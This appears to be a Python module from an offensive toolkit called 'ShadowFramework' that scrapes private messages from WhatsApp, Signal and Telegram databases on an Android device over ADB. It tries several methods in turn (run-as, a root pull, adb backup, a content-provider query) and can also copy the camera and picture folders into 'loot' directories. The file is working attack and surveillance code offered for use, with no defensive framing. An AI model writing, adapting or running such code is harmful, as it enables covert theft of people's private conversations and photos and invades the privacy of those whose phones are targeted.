"""
ShadowFramework — Signal/WhatsApp Message Scraper
Extracts messages from messenger databases via ADB.
"""
import subprocess
import os
import sqlite3
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=15):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1


# Database locations for common messengers
DB_PATHS = {
    'whatsapp': {
        'db': '/data/data/com.whatsapp/databases/msgstore.db',
        'wa4b': '/data/data/com.whatsapp.w4b/databases/msgstore.db',
        'backup': '/sdcard/WhatsApp/Databases/msgstore.db.crypt14',
        'media': '/sdcard/WhatsApp/Media/',
        'query': "SELECT key_remote_jid as contact, data as message, timestamp/1000 as ts FROM messages WHERE data IS NOT NULL ORDER BY timestamp DESC LIMIT {limit}",
    },
    'signal': {
        'db': '/data/data/org.thoughtcrime.securesms/databases/signal.db',
        'query': "SELECT thread_id, body, date_sent/1000 as ts FROM message WHERE body IS NOT NULL ORDER BY date_sent DESC LIMIT {limit}",
    },
    'telegram': {
        'db': '/data/data/org.telegram.messenger/files/cache4.db',
        'query': "SELECT uid, data FROM messages ORDER BY mid DESC LIMIT {limit}",
    },
}


class Module:
    MODULE_INFO = {
        'name': 'post/android/signal_whatsapp_scraper',
        'description': 'Extracts messages from WhatsApp, Signal, and Telegram databases via ADB.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'APP':       'Target app: whatsapp, signal, telegram, all [default: all]',
            'LIMIT':     'Max messages to extract [default: 50]',
            'PULL_MEDIA': 'Also pull media files [default: false]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _try_extract(self, device_id, app_name, db_info, limit):
        """Try multiple extraction methods for a messenger database."""
        console.print(f"\n[cyan][*] Extracting {app_name} messages...[/cyan]")
        
        db_path = db_info.get('db', '')
        query = db_info.get('query', '').format(limit=limit)
        
        # Check if app is installed
        pkg_map = {
            'whatsapp': 'com.whatsapp',
            'signal': 'org.thoughtcrime.securesms',
            'telegram': 'org.telegram.messenger',
        }
        pkg = pkg_map.get(app_name, '')
        installed, _, _ = _adb(device_id, 'shell', 'pm', 'list', 'packages', pkg)
        if pkg not in installed:
            console.print(f"  [dim]{app_name} not installed.[/dim]")
            return []

        loot_dir = Path(f'loot/messages/{app_name}')
        loot_dir.mkdir(parents=True, exist_ok=True)

        # Method 1: run-as (debuggable apps)
        console.print(f"  [dim]Method 1: run-as...[/dim]")
        out, err, rc = _adb(device_id, 'shell', 'run-as', pkg, 'cat', db_path.split('/')[-1])
        if rc == 0 and out and 'not debuggable' not in err:
            local_db = loot_dir / f'{app_name}.db'
            with open(local_db, 'wb') as f:
                f.write(out.encode('latin-1'))
            console.print(f"  [green]✓ Database extracted via run-as[/green]")
            return self._query_db(str(local_db), query, app_name)

        # Method 2: Direct pull (root)
        console.print(f"  [dim]Method 2: root pull...[/dim]")
        local_db = loot_dir / f'{app_name}.db'
        out, err, rc = _adb(device_id, 'pull', db_path, str(local_db))
        if rc == 0 and local_db.exists() and local_db.stat().st_size > 0:
            console.print(f"  [green]✓ Database pulled via root[/green]")
            return self._query_db(str(local_db), query, app_name)

        # Method 3: adb backup
        console.print(f"  [dim]Method 3: adb backup...[/dim]")
        backup_file = loot_dir / f'{app_name}.ab'
        out, err, rc = _adb(device_id, 'backup', '-f', str(backup_file), '-noapk', pkg, timeout=20)
        if backup_file.exists() and backup_file.stat().st_size > 100:
            console.print(f"  [yellow]Backup saved: {backup_file} ({backup_file.stat().st_size} bytes)[/yellow]")
            console.print(f"  [dim]Extract with: dd if={backup_file} bs=24 skip=1 | zlib-flate -uncompress | tar xf -[/dim]")

        # Method 4: Content provider query for WhatsApp
        if app_name == 'whatsapp':
            console.print(f"  [dim]Method 4: content provider...[/dim]")
            out, _, rc = _adb(device_id, 'shell', 'content', 'query',
                              '--uri', 'content://com.whatsapp.provider.media/media',
                              '--projection', '_id:mime_type:_data')
            if rc == 0 and out and 'Error' not in out:
                console.print(f"  [green]✓ WhatsApp content provider accessible[/green]")
                for line in out.splitlines()[:10]:
                    console.print(f"    [dim]{line}[/dim]")

            # Check for unencrypted backup
            backup_path = db_info.get('backup', '')
            if backup_path:
                out, _, rc = _adb(device_id, 'shell', 'ls', '-la', backup_path)
                if rc == 0 and out:
                    console.print(f"  [yellow]Encrypted backup found: {out}[/yellow]")
                    _adb(device_id, 'pull', backup_path, str(loot_dir / 'msgstore.db.crypt14'))

        console.print(f"  [dim]All extraction methods attempted.[/dim]")
        return []

    def _query_db(self, db_path, query, app_name):
        """Query extracted SQLite database."""
        messages = []
        try:
            conn = sqlite3.connect(db_path)
            cur = conn.cursor()
            cur.execute(query)
            rows = cur.fetchall()
            conn.close()

            for row in rows:
                messages.append(row)

            if messages:
                table = Table(title=f"{app_name} Messages ({len(messages)})")
                cols = [desc[0] for desc in cur.description] if hasattr(cur, 'description') else ['Col1', 'Col2', 'Col3']
                for col in cols[:3]:
                    table.add_column(col, max_width=40)
                for msg in messages[:20]:
                    table.add_row(*[str(m)[:40] if m else '' for m in msg[:3]])
                console.print(table)

        except Exception as e:
            console.print(f"  [red]DB query error: {e}[/red]")
        return messages

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        app = self.framework.options.get('APP', 'all').lower()
        limit = int(self.framework.options.get('LIMIT', '50'))
        pull_media = self.framework.options.get('PULL_MEDIA', 'false').lower() == 'true'

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] Messenger scraper on {device_id}[/cyan]")
        log_action(f"Messenger scraper on {device_id}")

        total = 0
        targets = DB_PATHS if app == 'all' else {app: DB_PATHS.get(app, {})}
        
        for app_name, db_info in targets.items():
            if not db_info:
                console.print(f"[yellow]Unknown app: {app_name}[/yellow]")
                continue
            msgs = self._try_extract(device_id, app_name, db_info, limit)
            total += len(msgs)

        # Pull media if requested
        if pull_media:
            console.print(f"\n[cyan][*] Pulling media files...[/cyan]")
            media_dirs = [
                ('/sdcard/WhatsApp/Media/', 'whatsapp'),
                ('/sdcard/Pictures/', 'pictures'),
                ('/sdcard/DCIM/Camera/', 'camera'),
            ]
            for remote, name in media_dirs:
                local = Path(f'loot/media/{name}')
                local.mkdir(parents=True, exist_ok=True)
                out, _, rc = _adb(device_id, 'pull', remote, str(local))
                if rc == 0:
                    console.print(f"  [green]✓ {name}[/green]")

        console.print(f"\n[bold green][+] Extracted {total} messages total.[/bold green]")
